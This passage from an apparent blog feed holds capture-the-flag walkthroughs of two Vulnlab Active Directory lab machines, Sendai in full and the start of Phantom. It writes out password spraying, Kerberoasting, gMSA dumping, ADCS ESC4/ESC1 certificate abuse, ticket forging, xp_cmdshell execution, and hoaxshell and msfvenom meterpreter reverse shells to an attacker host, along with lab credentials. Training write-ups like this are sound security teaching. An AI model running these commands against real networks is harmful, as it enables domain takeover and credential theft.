href="#Initial-Reconnaissance" class="headerlink" title="Initial Reconnaissance"></a>Initial Reconnaissance</h2><p>Our first step was to perform a port scan to identify available services:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Not shown: 65518 filtered tcp ports (no-response)</span><br><span class="line">PORT      STATE SERVICE       REASON          VERSION</span><br><span class="line">53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus</span><br><span class="line">80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0</span><br><span class="line">|_http-title: IIS Windows Server</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">| http-methods: </span><br><span class="line">|   Supported Methods: OPTIONS TRACE GET HEAD POST</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-04-08 12:50:51Z)</span><br><span class="line">135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory </span><br><span class="line">443/tcp   open  ssl/http      syn-ack ttl 127 Microsoft IIS httpd 10.0</span><br><span class="line">445/tcp   open  microsoft-ds? syn-ack ttl 127</span><br><span class="line">464/tcp   open  kpasswd5?     syn-ack ttl 127</span><br><span class="line">3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory</span><br><span class="line">3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services</span><br><span class="line">| ssl-cert: Subject: commonName=dc.sendai.vl</span><br><span class="line">49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49669/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">55350/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">55738/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">55770/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">55774/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br></pre></td></tr></table></figure><h2 id="SMB-Enumeration"><a href="#SMB-Enumeration" class="headerlink" title="SMB Enumeration"></a>SMB Enumeration</h2><p>We attempted to enumerate SMB shares using the guest account with a null password:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb 10.10.64.89 -u &#x27;guest&#x27; -p &#x27;&#x27; --shares</span><br></pre></td></tr></table></figure><p><img src="/images/Sendai/null_ses.png" alt="Guest SMB Enumeration Results"></p><h2 id="User-Enumeration"><a href="#User-Enumeration" class="headerlink" title="User Enumeration"></a>User Enumeration</h2><p>Next, we used impacket-lookupsid to enumerate domain users:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-lookupsid sendai.vl/guest@dc.sendai.vl -target 10.10.64.89 -no-pass</span><br></pre></td></tr></table></figure><p>This returned the following users:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">Administrator</span><br><span class="line">Guest</span><br><span class="line">krbtgt</span><br><span class="line">DC$</span><br><span class="line">sqlsvc</span><br><span class="line">websvc</span><br><span class="line">Dorothy.Jones</span><br><span class="line">Kerry.Robinson</span><br><span class="line">Naomi.Gardner</span><br><span class="line">Anthony.Smith</span><br><span class="line">Susan.Harper</span><br><span class="line">Stephen.Simpson</span><br><span class="line">Marie.Gallagher</span><br><span class="line">Kathleen.Kelly</span><br><span class="line">Norman.Baxter</span><br><span class="line">Jason.Brady</span><br><span class="line">Elliot.Yates</span><br><span class="line">Malcolm.Smith</span><br><span class="line">Lisa.Williams</span><br><span class="line">Ross.Sullivan</span><br><span class="line">Clifford.Davey</span><br><span class="line">Declan.Jenkins</span><br><span class="line">Lawrence.Grant</span><br><span class="line">Leslie.Johnson</span><br><span class="line">Megan.Edwards</span><br><span class="line">Thomas.Powell</span><br><span class="line">mgtsvc$</span><br></pre></td></tr></table></figure><h2 id="Share-Access"><a href="#Share-Access" class="headerlink" title="Share Access"></a>Share Access</h2><p>We accessed the “sendai” share using the guest account:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.64.89/sendai -U guest</span><br></pre></td></tr></table></figure><p><img src="/images/Sendai/sendai_share.png" alt="Sendai Share Contents"><br>Inside the share, we found an <code>incident.txt</code> file mentioning a penetration test that discovered many weak passwords:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Dear valued employees,</span><br><span class="line"></span><br><span class="line">We hope this message finds you well. We would like to inform you about an important security update regarding user account passwords. Recently, we conducted a thorough penetration test, which revealed that a significant number of user accounts have weak and insecure passwords.</span><br><span class="line"></span><br><span class="line">To address this concern and maintain the highest level of security within our organization, the IT department has taken immediate action. All user accounts with insecure passwords have been expired as a precautionary measure. This means that affected users will be required to change their passwords upon their next login.</span><br><span class="line"></span><br><span class="line">We kindly request all impacted users to follow the password reset process promptly to ensure the security and integrity of our systems. Please bear in mind that strong passwords play a crucial role in safeguarding sensitive information and protecting our network from potential threats.</span><br><span class="line"></span><br><span class="line">If you need assistance or have any questions regarding the password reset procedure, please don&#x27;t hesitate to reach out to the IT support team. They will be more than happy to guide you through the process and provide any necessary support.</span><br><span class="line"></span><br><span class="line">Thank you for your cooperation and commitment to maintaining a secure environment for all of us. Your vigilance and adherence to robust security practices contribute significantly to our collective safety. </span><br></pre></td></tr></table></figure><h2 id="Password-Spray-and-Reset"><a href="#Password-Spray-and-Reset" class="headerlink" title="Password Spray and Reset"></a>Password Spray and Reset</h2><p>To identify users with expired passwords, we performed a password spray looking for the <code>STATUS_PASSWORD_MUST_CHANGE</code> flag:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb sendai.vl -u usernames.txt -p &#x27;&#x27; --continue-on-success</span><br></pre></td></tr></table></figure><p><img src="/images/Sendai/weak_pass_users.png" alt="Users With Expired Passwords"><br>We found that <code>Elliot.Yates</code> and <code>Thomas.Powell</code> had expired passwords. Using impacket’s changepasswd, we reset their passwords:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">changepasswd.py DOMAIN/Elliot.Yates:&#x27;&#x27;@10.10.72.160</span><br></pre></td></tr></table></figure><p>When prompted for the current password, we pressed enter and set a new password that met the domain’s policy: <code>HelloWorld123@</code><br>We then confirmed access with the new password:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb sendai.vl -u Elliot.Yates -p &#x27;HelloWorld123@&#x27; --shares</span><br></pre></td></tr></table></figure><p><img src="/images/Sendai/ellio_shares.png" alt="Elliot&#39;s Accessible Shares"></p><h2 id="Domain-Enumeration-with-BloodHound"><a href="#Domain-Enumeration-with-BloodHound" class="headerlink" title="Domain Enumeration with BloodHound"></a>Domain Enumeration with BloodHound</h2><p>Before exploring the newly accessible shares, we ran BloodHound to get a better understanding of the domain:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec ldap sendai.vl -u Elliot.Yates -p &#x27;HelloWorld123@&#x27; --bloodhound --dns-server 10.10.72.160 -c ALL --dns-tcp</span><br></pre></td></tr></table></figure><p><img src="/images/Sendai/firts_pth.png" alt="Initial BloodHound Path"><br>From our findings, we identified several potential attack paths:</p><ol><li>Attempt to kerberoast the sql_svc account</li><li>Explore the “config” and “sendai” shares for useful information</li><li>Target the MGTSVC account to gain WinRM access to the DC</li></ol><h2 id="Kerberoasting"><a href="#Kerberoasting" class="headerlink" title="Kerberoasting"></a>Kerberoasting</h2><p>We attempted to kerberoast the sql_svc account:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-GetUserSPNs -dc-ip 10.10.72.160 -request sendai.vl/Elliot.Yates:&#x27;HelloWorld123@&#x27; -dc-host DC.sendai.vl</span><br></pre></td></tr></table></figure><p><img src="/images/Sendai/sql_svc_hash.png" alt="SQL Service Account Hash"><br>However, we were unable to crack the hash:<br><img src="/images/Sendai/not_cracked.png" alt="Hash Cracking Attempt Failed"></p><h2 id="Exploring-Shares"><a href="#Exploring-Shares" class="headerlink" title="Exploring Shares"></a>Exploring Shares</h2><p>We accessed the “config” share to look for sensitive information:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.72.160/config -U Elliot.Yates </span><br></pre></td></tr></table></figure><p><img src="/images/Sendai/confi_share.png" alt="Config Share Contents"><br>We found a <code>.sqlconfig</code> file containing credentials for the SQL service account:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Server=dc.sendai.vl,1433;Database=prod;User Id=sqlsvc;Password=&lt;PASSWORD&gt;;</span><br></pre></td></tr></table></figure><p>The SQL service account credentials were:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlsvc:SurenessBlob85</span><br></pre></td></tr></table></figure><p>We also noted that the MSSQL service was running on port 1433, which wasn’t visible in our initial scan, suggesting firewall restrictions.</p><h2 id="gMSA-Password-Extraction"><a href="#gMSA-Password-Extraction" class="headerlink" title="gMSA Password Extraction"></a>gMSA Password Extraction</h2><p>First, we added <code>Elliot.Yates</code> to the ADMSVC group:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodyAD --host DC.sendai.vl -u &#x27;Elliot.Yates&#x27; -p &#x27;HelloWorld123@&#x27; -d &#x27;sendai.vl&#x27; add groupMember ADMSVC Elliot.Yates</span><br></pre></td></tr></table></figure><p>Then we used <code>gMSADumper</code> to retrieve the password for the GMSA account and convert it to an NT hash:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 gMSADumper.py -u &#x27;Elliot.Yates&#x27; -p &#x27;HelloWorld123@&#x27; -d &#x27;sendai.vl&#x27;</span><br></pre></td></tr></table></figure><p><img src="/images/Sendai/gmsadump.png" alt="gMSA Dump Results"><br>With the NT hash, we established a WinRM session:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i sendai.vl -u &#x27;mgtsvc$&#x27; -H &lt;HASH&gt;</span><br></pre></td></tr></table></figure><p>(We found the user.txt flag at C:\user.txt)</p><h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><p>We discovered that our user could add workstations to the domain.<br><img src="/images/Sendai/add_workstasions.png" alt="Add Workstations Permission"><br>To find additional privilege escalation vectors, we ran <code>PrivescCheck.ps1</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">..\PrivescCheck.ps1; Invoke-PrivescCheck</span><br></pre></td></tr></table></figure><p>While no cleartext passwords were found, the script discovered a service with credentials in its ImagePath:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Name        : Support</span><br><span class="line">DisplayName :</span><br><span class="line">ImagePath   : C:\WINDOWS\helpdesk.exe -u clifford.davey -p PASS -k netsvcs</span><br><span class="line">User        : LocalSystem</span><br><span class="line">StartMode   : Automatic</span><br></pre></td></tr></table></figure><p>Checking BloodHound again, we found that Clifford.Davey is part of the CA-Operators group:<br><img src="/images/Sendai/ca_operators.png" alt="CA Operators Group Membership"></p><h2 id="ADCS-ESC4-Exploitation"><a href="#ADCS-ESC4-Exploitation" class="headerlink" title="ADCS ESC4 Exploitation"></a>ADCS ESC4 Exploitation</h2><p>We enumerated certificate templates using Clifford’s account:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy find -target 10.10.72.160 -dc-ip 10.10.72.160 -u &#x27;clifford.davey@sendai.vl&#x27; -p &#x27;&#x27; -debug </span><br></pre></td></tr></table></figure><p>We identified a vulnerable certificate template:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">Certificate Templates</span><br><span class="line">  0</span><br><span class="line">    Template Name                       : SendaiComputer</span><br><span class="line">    Display Name                        : SendaiComputer</span><br><span class="line">    Certificate Authorities             : sendai-DC-CA</span><br><span class="line">    Enabled                             : True</span><br><span class="line">    Client Authentication               : True</span><br><span class="line">    Enrollment Agent                    : False</span><br><span class="line">    Any Purpose                         : False</span><br><span class="line">    Enrollee Supplies Subject           : False</span><br><span class="line">    Certificate Name Flag               : SubjectAltRequireDns</span><br><span class="line">    Enrollment Flag                     : AutoEnrollment</span><br><span class="line">    Private Key Flag                    : 16842752</span><br><span class="line">    Extended Key Usage                  : Server Authentication</span><br><span class="line">                                          Client Authentication</span><br><span class="line">    Requires Manager Approval           : False</span><br><span class="line">    Requires Key Archival               : False</span><br><span class="line">    Authorized Signatures Required      : 0</span><br><span class="line">    Validity Period                     : 100 years</span><br><span class="line">    Renewal Period                      : 6 weeks</span><br><span class="line">    Minimum RSA Key Length              : 4096</span><br><span class="line">    Permissions</span><br><span class="line">      Enrollment Permissions</span><br><span class="line">        Enrollment Rights               : SENDAI.VL\Domain Admins</span><br><span class="line">                                          SENDAI.VL\Domain Computers</span><br><span class="line">                                          SENDAI.VL\Enterprise Admins</span><br><span class="line">      Object Control Permissions</span><br><span class="line">        Owner                           : SENDAI.VL\Administrator</span><br><span class="line">        Full Control Principals         : SENDAI.VL\ca-operators</span><br><span class="line">        Write Owner Principals          : SENDAI.VL\Domain Admins</span><br><span class="line">                                          SENDAI.VL\Enterprise Admins</span><br><span class="line">                                          SENDAI.VL\Administrator</span><br><span class="line">                                          SENDAI.VL\ca-operators</span><br><span class="line">        Write Dacl Principals           : SENDAI.VL\Domain Admins</span><br><span class="line">                                          SENDAI.VL\Enterprise Admins</span><br><span class="line">                                          SENDAI.VL\Administrator</span><br><span class="line">                                          SENDAI.VL\ca-operators</span><br><span class="line">        Write Property Principals       : SENDAI.VL\Domain Admins</span><br><span class="line">                                          SENDAI.VL\Enterprise Admins</span><br><span class="line">                                          SENDAI.VL\Administrator</span><br><span class="line">                                          SENDAI.VL\ca-operators</span><br><span class="line">    [!] Vulnerabilities</span><br><span class="line">      ESC4                              : &#x27;SENDAI.VL\\ca-operators&#x27; has dangerous permissions</span><br></pre></td></tr></table></figure><p>We exploited ESC4 by modifying the template to be vulnerable to ESC1. First, we made a backup of the original configuration and made our changes:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy template -u clifford.davey@sendai.vl -template SendaiComputer -save-old -p &#x27;RFmoB2WplgE_3p&#x27; -dc-ip 10.10.72.160</span><br></pre></td></tr></table></figure><p>Then, we exploited it as if it were an ESC1 vulnerability:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy req -u clifford.davey@sendai.cl -template SendaiComputer -upn administrator@sendai.vl -ca sendai-DC-CA -dc-ip 10.10.72.160 -target-ip 10.10.72.160 -p &#x27;&#x27; -debug</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy auth -pfx &#x27;administrator.pfx&#x27; -dc-ip 10.10.72.160 -domain sendai.vl</span><br></pre></td></tr></table></figure><p><img src="/images/Sendai/esc01.png" alt="ESC1 Exploitation Success"><br>Finally, we established a WinRM session as Administrator:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i sendai.vl -u administrator -H &lt;HASH&gt;</span><br></pre></td></tr></table></figure><h2 id="Alternative-Path-MSSQL-Server-Exploitation"><a href="#Alternative-Path-MSSQL-Server-Exploitation" class="headerlink" title="Alternative Path: MSSQL Server Exploitation"></a>Alternative Path: MSSQL Server Exploitation</h2><p>An alternative path involves accessing the SQL server via a proxy to expose the MSSQL port to our machine. This approach uses the following steps:</p><ol><li>Use ligolo or chisel to expose the MSSQL port</li><li>Create a Kerberos ticket for the Administrator:</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ticketer.py -spn MSSQL/dc.sendai.vl -domain-sid S-1-5-21-3085872742-570972823-736764132 -nthash [MSSQL-HASH] -dc-ip dc.sendai.vl Administrator -domain sendai.vl</span><br><span class="line">export KRB5CCNAME=Administrator.ccache</span><br></pre></td></tr></table></figure><ol start="3"><li>Connect to the SQL server with the ticket:</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">impacket-mssqlclient dc.sendai.vl -k</span><br><span class="line">enable_xp_cmdshell</span><br></pre></td></tr></table></figure><ol start="4"><li>Set up a command shell to establish remote access:</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hoaxshell -s ip --p 4444</span><br></pre></td></tr></table></figure><ol start="5"><li>Execute the shell command:</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC master..xp_cmdshell &#x27;powershell -e &lt;hoaxshell&gt;&#x27;</span><br></pre></td></tr></table></figure><ol start="6"><li>Create and upload a Meterpreter shell:</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=ip LPORT=443 -f exe -o shell.exe</span><br></pre></td></tr></table></figure><ol start="7"><li>After getting a Meterpreter session, simply run <code>getsystem</code> to escalate privileges.</li></ol><p><a href="https://api.vulnlab.com/api/v1/share?id=9b6979e9-cbac-4893-8a52-68def2ae889f" title="https:&#x2F;&#x2F;api.vulnlab.com&#x2F;api&#x2F;v1&#x2F;share?id&#x3D;9b6979e9-cbac-4893-8a52-68def2ae889f">https://api.vulnlab.com/api/v1/share?id=9b6979e9-cbac-4893-8a52-68def2ae889f</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> VulnLab </tag>
            
            <tag> Hack The Box </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VL-Phantom</title>
      <link href="/2025/04/05/VL-Phantom/"/>
      <url>/2025/04/05/VL-Phantom/</url>
      
        <content type="html"><![CDATA[<h1 id="VL-Phantom-Advanced-Resource-Based-Constrained-Delegation-Attack-Walkthrough"><a href="#VL-Phantom-Advanced-Resource-Based-Constrained-Delegation-Attack-Walkthrough" class="headerlink" title="VL-Phantom: Advanced Resource-Based Constrained Delegation Attack Walkthrough"></a>VL-Phantom: Advanced Resource-Based Constrained Delegation Attack Walkthrough</h1><p>This detailed Vulnlab - Hack The Box penetration testing walkthrough documents my systematic approach to compromising the Phantom Active Directory environment. Beginning with thorough reconnaissance and open-source intelligence gathering from an exposed email attachment, I discovered a default onboarding password being used across the domain. Through methodical password spraying, encrypted backup cracking, and privilege escalation via service account compromise, I ultimately executed an advanced Resource-Based Constrained Delegation (RBCD) attack to achieve domain administrator access. This step-by-step technical guide demonstrates sophisticated Active Directory exploitation techniques including password manipulation, Kerberos ticket manipulation, and delegation abuse - essential knowledge for security professionals conducting thorough penetration tests against enterprise environments. The walkthrough illustrates how seemingly minor security oversights, like unchanged default passwords and excessive user permissions, can be chained together to completely compromise an Active Directory domain.</p><h2 id="Initial-Reconnaissance"><a href="#Initial-Reconnaissance" class="headerlink" title="Initial Reconnaissance"></a>Initial Reconnaissance</h2><p>First, I performed a port scan to identify available services:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE       REASON          VERSION</span><br><span class="line">53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus</span><br><span class="line">88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos</span><br><span class="line">135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory </span><br><span class="line">445/tcp   open  microsoft-ds? syn-ack ttl 127</span><br><span class="line">464/tcp   open  kpasswd5?     syn-ack ttl 127</span><br><span class="line">593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  tcpwrapped    syn-ack ttl 127</span><br><span class="line">3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory </span><br><span class="line">3269/tcp  open  tcpwrapped    syn-ack ttl 127</span><br><span class="line">3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services</span><br><span class="line">| rdp-ntlm-info: </span><br><span class="line">|   Target_Name: PHANTOM</span><br><span class="line">|   NetBIOS_Domain_Name: PHANTOM</span><br><span class="line">|   NetBIOS_Computer_Name: DC</span><br><span class="line">|   DNS_Domain_Name: phantom.vl</span><br><span class="line">|   DNS_Computer_Name: DC.phantom.vl</span><br><span class="line">|   Product_Version: 10.0.20348</span><br><span class="line">|_  System_Time: 2025-04-05T12:12:58+00:00</span><br><span class="line">5357/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 </span><br><span class="line">5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 </span><br><span class="line">9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing</span><br><span class="line">49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49672/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49673/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49681/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49714/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49839/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   3:1:1: </span><br><span class="line">|_    Message signing enabled and required</span><br></pre></td></tr></table></figure><p>The open ports reveal this is a Windows domain controller (<code>phantom.vl</code>) with typical Active Directory services running, including SMB, Kerberos, LDAP, and WinRM.</p><h2 id="Initial-Access"><a href="#Initial-Access" class="headerlink" title="Initial Access"></a>Initial Access</h2><p>I started by exploring SMB shares accessible with the guest account:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb phantom.vl -u &#x27;guest&#x27; -p &#x27;&#x27; --shares</span><br></pre></td></tr></table></figure><p><img src="/images/Phantom/guest_share.png" alt="Guest SMB Share Access"><br>I discovered a publicly accessible share that I could connect to:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.122.37/Public -U guest</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get tech_support_email.eml</span><br></pre></td></tr></table></figure><p><img src="/images/Phantom/public_share.png" alt="Public Share Contents"></p><h2 id="Extracting-User-Information"><a href="#Extracting-User-Information" class="headerlink" title="Extracting User Information"></a>Extracting User Information</h2><p>I examined the email file for potential user accounts:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings tech_support_email.eml</span><br></pre></td></tr></table></figure><p><img src="/images/Phantom/email.png" alt="Email Analysis"><br>Two possible users were identified:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">alucas@phantom.vl</span><br><span class="line">techsupport@phantom.vl</span><br></pre></td></tr></table></figure><p>The email also contained an embedded PDF with onboarding instructions. I extracted it using:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">munpack tech_support_email.eml</span><br></pre></td></tr></table></figure><p><img src="/images/Phantom/psdinfo.png" alt="PDF Information"><br>The PDF revealed a potential default password used during employee onboarding: <code>Ph4nt0m@5t4rt!</code></p><h2 id="User-Enumeration"><a href="#User-Enumeration" class="headerlink" title="User Enumeration"></a>User Enumeration</h2><p>Using the null session access, I was able to enumerate all domain users:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-lookupsid phantom.vl/guest@10.10.122.37 -target-ip 10.10.122.37 -no-pass</span><br></pre></td></tr></table></figure><p>User list obtained:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 